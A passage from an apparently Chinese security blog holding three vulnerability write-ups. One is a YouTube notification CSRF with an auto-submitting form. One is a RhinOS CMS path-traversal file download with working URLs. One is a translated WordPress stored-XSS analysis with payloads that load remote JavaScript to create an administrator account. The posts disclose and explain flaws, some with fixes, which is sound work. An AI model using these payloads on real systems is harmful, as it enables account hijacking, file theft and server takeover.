class="line">sw.js：</span><br><span class="line"></span><br><span class="line">self.addEventListener(&apos;activate&apos;, async () =&gt; &#123;   console.log(&quot;Hello&quot;);</span><br><span class="line">      self.registration.pushManager.subscribe()</span><br><span class="line">  .then(function(subscription) &#123;</span><br><span class="line">          console.log(JSON.stringify(subscription));</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(function(e) &#123;</span><br><span class="line">    console.log(e);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)</span><br><span class="line">self.addEventListener(&quot;push&quot;, function(event) &#123;</span><br><span class="line">  if (event.data) &#123;</span><br><span class="line">    console.log(&quot;Push event!! &quot;, event.data.text());</span><br><span class="line">    showLocalNotification(&quot;Yolo&quot;, event.data.text(),  self.registration);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    console.log(&quot;Push event but no data&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">const showLocalNotification = (title, body, swRegistration) =&gt; &#123;</span><br><span class="line">  const options = &#123;</span><br><span class="line">    body</span><br><span class="line">    // here you can add more properties like icon, image, vibrate, etc.</span><br><span class="line">  &#125;;</span><br><span class="line">  swRegistration.showNotification(title, options);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这三个代码文件的目的在于获取sw.js请求时生成的各个参数，有了这些参数，就可以间接形成通知（Notification），打开其中的index.html页面，点击Ask Permission按钮请求通知权限，后台调用sw.js脚本，通过内置的Firefox API形成一个本地的通知服务端，通知请求提交时，我们就能获取到其中的各个参数。利用这些参数，可以进一步构造出CSRF攻击框架，就能获取到对应的通知消息。<br>在本地loclalhost构造这种通知请求服务端，需要用到Service Worker 服务工作线程（sw.js）的部署原理，其中涉及服务注册、激活、缓存控制和相关响应机制，具体可参考：developer.mozilla.org和developers.google.com中的详细介绍说明。</p>
<p><img src="http://zone.secevery.com/uploads/article/20190428/44a3ae0150b0efc2c8dd3d2f34a4a035.png" alt></p>
<p>综合上述分析，基于我们之前创建的本地通知服务端，结合Youtube的通知请求提交方式，我构造了以下CSRF攻击框架：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;https://www.youtube.com/notifications_ajax?action_register_device=1&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; name=&quot;csrf&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;device_id&quot; value=&quot;replace&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;permission&quot; value=&quot;granted&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;endpoint&quot; value=&quot;replace&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;p256dh_key&quot; value=&quot;replace=&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;auth_key&quot; value=&quot;replace&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">        &lt;script type=&quot;text/javascript&quot;&gt;document.csrf.submit();&lt;/script&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>让我意想不到的是，我在其中以其他Youtube账号身份，利用获取到的各种请求参数，提交了通知请求，竟然能有效实施通知消息的CSRF攻击。也就是说，我们现在可以劫持到其他Youtube账号的消息推送接口（PUSH webhook），以其他Youtube账号身份收取到Youtube响应该账号的相关通知，这些通知可能是他订阅的某个频道或视频的更新消息，也可能是他私人视频的观众评论等，如下：</p>
<p><img src="http://zone.secevery.com/uploads/article/20190428/0131bb86ac1e5fa9eaa19bafbab8c677.png" alt></p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/漏洞/">漏洞</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-漏洞搜集/犀牛(RhinOS)CMS3.X任意文件下载漏洞(CVE-2018-18760)" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/漏洞搜集/犀牛(RhinOS)CMS3.X任意文件下载漏洞(CVE-2018-18760)/" class="article-date">
      <time datetime="2019-12-06T17:03:10.532Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/漏洞搜集/犀牛(RhinOS)CMS3.X任意文件下载漏洞(CVE-2018-18760)/">犀牛(RhinOS)CMS3.X任意文件下载漏洞(CVE-2018-18760)</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="01简介"><a href="#01简介" class="headerlink" title="01简介"></a>01简介</h2><p>RhinOS是一个使用最新功能开发网站的框架，可以为Web门户提供最快的访问和管理。RhinOSCMS对于网站管理功能十分强劲，内置允许使用数据库进程和解析器模块快速访问数据库，xml和其他资源，购物车，标签和参数化文件，配置参数，Intranet访问，数据库会话，电子邮件发送，验证码安全系统，快速过滤，列表和详细信息的模块，功能可谓是非常之多了。RhinOSCMS的download.php文件存在任意文件下载漏洞，通过漏洞能够下载任意的文件。</p>
<h2 id="02环境搭建"><a href="#02环境搭建" class="headerlink" title="02环境搭建"></a>02环境搭建</h2><p>RhinOS CMS下载地址为：<a href="https://sourceforge.net/projects/rhinos/。下载完成后，打开文件，一直点下一步就能够完成安装，如图1所示。" target="_blank" rel="noopener">https://sourceforge.net/projects/rhinos/。下载完成后，打开文件，一直点下一步就能够完成安装，如图1所示。</a></p>
<p><img src="https://pic3.zhimg.com/v2-db2e62b8afcecde12a1a92d999bf817e_r.jpg" alt></p>
<p>图1完成安装</p>
<p>由于一些编码原因，安装成功后的的信息会显示一些乱码，如果使用西班牙语的系统就能正常显示了。然后需要将httpd.conf中的端口修改为8080端口，修改端口是为了避免和WINDOWS本身一些服务冲突，http.conf所在路径为：C:\rhinos\httpd\conf\httpd.conf。如图2所示。</p>
<p><img src="https://pic1.zhimg.com/v2-fbaf714d0454c7874b0043bba8dfd1b8_r.jpg" alt></p>
<p>图2httpd.conf所在路径</p>
<p>右键编辑将文件中的80端口修改为8080端口，如图3所示。</p>
<p><img src="https://pic2.zhimg.com/v2-ea92189b90a709947773a0c041e042c5_r.jpg" alt></p>
<p>图3修改端口</p>
<p>修改端口后需要重启阿帕奇服务，重启服务后访问<a href="http://127.0.0.1:8080。就能够访问到已经搭建好的CMS了，如图4所示。" target="_blank" rel="noopener">http://127.0.0.1:8080。就能够访问到已经搭建好的CMS了，如图4所示。</a></p>
<p><img src="https://pic4.zhimg.com/80/v2-0902d18ccba9d23b28d2be02e9f374f3_hd.jpg" alt></p>
<p>图4重启apache服务后访问</p>
<h2 id="03漏洞代码审计"><a href="#03漏洞代码审计" class="headerlink" title="03漏洞代码审计"></a>03漏洞代码审计</h2><p>漏洞存在于C:\rhinos\demo\admin\php\download.php中，在第30行代码，能够看到文件读取的路径拼接操作，如图5所示。</p>
<p><img src="https://pic1.zhimg.com/v2-7e723ece58ccea364a50eb6ffe8913f4_r.jpg" alt></p>
<p>图5download.php</p>
<p>看到getParam()，查找这个方法是如何实现的。<br>这个函数存在于：C:\rhinos\demo\admin\php\connect.php。第88行，如图6所示。</p>
<p><img src="https://pic2.zhimg.com/v2-f1f16f289aba167af53da72aebd65729_r.jpg" alt></p>
<p>图6connect.php</p>
<p>这个函数中获取了”file”的参数，通过POST或者GET提交都是可以的。然后根据图5所示第41行触发文件读取操作，如果控制参数file则能够成为任意文件读取漏洞或者为任意文件下载漏洞。</p>
<h2 id="04漏洞复现"><a href="#04漏洞复现" class="headerlink" title="04漏洞复现"></a>04漏洞复现</h2><p>在复现之前需要找到从什么地方调用到了download.php,在经过测试之后发现通过这个URL提交就能够利用漏洞下载到config.php文件,但是首先需要登录后台。URL如下:<br><a href="http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../config.php，如图7所示。" target="_blank" rel="noopener">http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../config.php，如图7所示。</a></p>
<p><img src="https://pic3.zhimg.com/v2-18183c286be55b1b067a55f89ca4deaa_r.jpg" alt></p>
<p>图7下载config.php</p>
<p>当然既然是任意文件下来漏洞肯定可以下载windows目录下面的win.ini文件，使用URL为:<br><a href="http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../../../../Windows/win.ini。执行后就能够下载文件了。如图8所示。" target="_blank" rel="noopener">http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../../../../Windows/win.ini。执行后就能够下载文件了。如图8所示。</a></p>
<p><img src="https://pic4.zhimg.com/v2-fddb74e5019196975e2663db99b48ff3_r.jpg" alt></p>
<p>图8下载win.ini</p>
<p>##05修复建议<br>根据前文的描述能够看出，漏洞存在一定的危害。应该对于漏洞进行修复，关于如何去修复漏洞。</p>
<p>1.过滤点[.]要求用户在url中不能回溯上级目录。<br>2.正则严格判断用户输入参数的格式，保证输入参数的准确性。<br>3.将下载区独立放在项目路径外，分配每个下载资源固定的URL,不能是所有的下载资源都是统一的URL：<br><a href="http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=文件名" target="_blank" rel="noopener">http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=文件名</a></p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/漏洞/">漏洞</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-漏洞搜集/WordPress存储型XSS漏洞分析" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/漏洞搜集/WordPress存储型XSS漏洞分析/" class="article-date">
      <time datetime="2019-12-06T17:03:10.528Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/漏洞搜集/WordPress存储型XSS漏洞分析/">WordPress存储型XSS漏洞分析</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p><strong>译文声明<br>本文是翻译文章，文章原作者fortinet，文章来源：fortinet.com<br>原文地址：<a href="https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html" target="_blank" rel="noopener">https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html</a><br>译文仅供参考，具体内容表达以及含义原文为准</strong></p>
<p><img src="https://p3.ssl.qhimg.com/t0154214347380ba2a2.png" alt> </p>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>WordPress是世界上最流行的CMS（内容管理系统），占据全球60.4%的市场份额，这个数字远远高于第二名的Joomla!（5.2%的市场份额）。因此，在互联网上有超过三分之一的网站采用WordPress构建。</p>
<p>FortiGuard Labs团队最近在WordPress中发现了一个存储型XSS（Cross-Site Scripting）0day漏洞，这个XSS漏洞位于WordPress 5.0新增的Gutenberg编辑器中，该编辑器无法正确过滤Shortcode（短代码）错误消息中的JavaScript/HTML代码。如果远程攻击者具备Contributor（贡献者）或者更高权限，当受害者访问被攻击的网页时，攻击者就可以在受害者浏览器上下文中执行任意JavaScript/HTML代码。如果受害者具备更高权限（比如管理员权限），攻击者甚至可以攻破整个web服务器。</p>
<p>这个存储型XSS漏洞影响5.0至5.2.2版的WordPress。</p>
<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>在WordPress 5.0中，用户可以在文章（post）中添加Shortcode块（block）。当在Shortcode块中添加特定的HTML编码字符（比如&lt;）然后重新打开该文章时，WordPress就会显示一个错误消息，将&lt;解码成&lt;然后展示预览。</p>
<p><img src="https://p5.ssl.qhimg.com/t018c8ac1b86a6e22ac.png" alt><br>图1. 在Shortcode块中插入HTML编码字符</p>
<p><img src="https://p1.ssl.qhimg.com/t0113d0da196199b259.png" alt><br>图2. Shortcode错误消息预览</p>
<p>我们可以使用<strong>“&gt;&lt;img src=1 onerror=prompt(1)&gt;</strong>这段PoC代码轻松绕过预览视图中的XSS过滤器。</p>
<p><img src="https://p1.ssl.qhimg.com/t0113d0da196199b259.png" alt><br>图3. 将PoC代码插入Shortcode块</p>
<p>当受害者查看该文章时，就会在浏览器中执行XSS代码。</p>
<p><img src="https://p3.ssl.qhimg.com/t010226398ebf02fdd8.png" alt><br>图4. WordPress Shortcode预览XSS</p>
<p>如果受害者刚好具备管理员权限，那么攻击者就可以利用该漏洞来获取管理员账户的控制权，利用WordPress内置的函数拿到shell，进一步控制整个服务器。</p>
<p>比如，攻击者可以在自己的web服务器上托管一个JavaScript文件（这里以wpaddadmin.js为例），这段JavaScript代码会添加一个WordPress管理员账户，用户名为attack，密码为attack。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// Send a GET request to the URL &apos;/wordpress/wp-admin/user-new.php&apos;, and extract the current &apos;nonce&apos; value  </span><br><span class="line">var ajaxRequest = new XMLHttpRequest();  </span><br><span class="line">var requestURL = &quot;/wordpress/wp-admin/user-new.php&quot;;  </span><br><span class="line">var nonceRegex = /ser&quot; value=&quot;([^&quot;]*?)&quot;/g;  </span><br><span class="line">ajaxRequest.open(&quot;GET&quot;, requestURL, false);  </span><br><span class="line">ajaxRequest.send();  </span><br><span class="line">var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);  </span><br><span class="line">var nonce = nonceMatch[1];  </span><br><span class="line"></span><br><span class="line">// Construct a POST query, using the previously extracted &apos;nonce&apos; value, and create a new user with an arbitrary username / password, as an Administrator  </span><br><span class="line">var params = &quot;action=createuser&amp;_wpnonce_create-user=&quot;+nonce+&quot;&amp;user_login=attacker&amp;email=attacker@site.com&amp;pass1=attacker&amp;pass2=attacker&amp;role=administrator&quot;;  </span><br><span class="line">ajaxRequest = new XMLHttpRequest();  </span><br><span class="line">ajaxRequest.open(&quot;POST&quot;, requestURL, true);  </span><br><span class="line">ajaxRequest.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);  </span><br><span class="line">ajaxRequest.send(params);</span><br></pre></td></tr></table></figure>
<p>然后攻击者可以使用如下PoC来插入JavaScript。</p>
<p><code>&quot;&amp;gt;&amp;lt;img src=1 onerror=&quot;javascript&amp;colon;(function () { var url = &#39;http://aaa.bbb.ccc.ddd/ wpaddadmin.js&#39;;if (typeof beef == &#39;undefined&#39;) { var bf = document.createElement(&#39;script&#39;); bf.type = &#39;text/javascript&#39;; bf.src = url; document.body.appendChild(bf);}})();&quot;&amp;gt;</code><br><img src="https://p3.ssl.qhimg.com/t01ff29771459e602b0.png" alt><br>图5. 插入XSS代码以添加管理员账户</p>
<p>一旦具备高权限的受害者查看该文章，就会创建attacker管理员账户。<br><img src="https://p4.ssl.qhimg.com/t010e42abaa7fcc8d89.png" alt><br>图6. 执行XSS代码</p>
<p><img src="https://p4.ssl.qhimg.com/t013e0fbc54e4f4a6c4.png" alt><br>图7. XSS代码成功创建具备管理员权限的attacker账户</p>
<p>随后攻击者可以修改已有的php文件，改成webshell代码，以便接管目标web服务器。</p>
<p><img src="https://p0.ssl.qhimg.com/t0131da4b3ea2ca7c86.png" alt></p>
<p>图8. 使用攻击者账户添加webshell</p>
<p><img src="https://p1.ssl.qhimg.com/t01c0b5cda440e3cf4b.png" alt><br>图9. 控制web服务器</p>
<h2 id="0x02-解决方案"><a href="#0x02-解决方案" class="headerlink" title="0x02 解决方案"></a>0x02 解决方案</h2><p>FortiGuard Labs向WordPress反馈了这个0day漏洞，官方很快发布了相应补丁。如果大家正在使用存在漏洞的WordPress版本，请尽快升级到最新版，或者及时打上补丁。</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/漏洞/">漏洞</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2021 JYP
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="http://bestwing.me" target="_blank">Sw'blog</a> by Swing
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style="display:none">
                        <span id="site-visit">海贼到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style="display:none">
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>

    <script>
        $(document).ready(function() {
            var backgroundnum = 24;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


    <script type="text/javascript">
      window.onload = function(){
        document.getElementById("search").onclick = function(){
            console.log("search")
            search();
        }
      }
      function search(){
        (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
        (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
        e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
        })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');

        _st('install','A1Pz-LKMXbrzcFg2FWi6','2.0.0');
      }
    </script>

  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>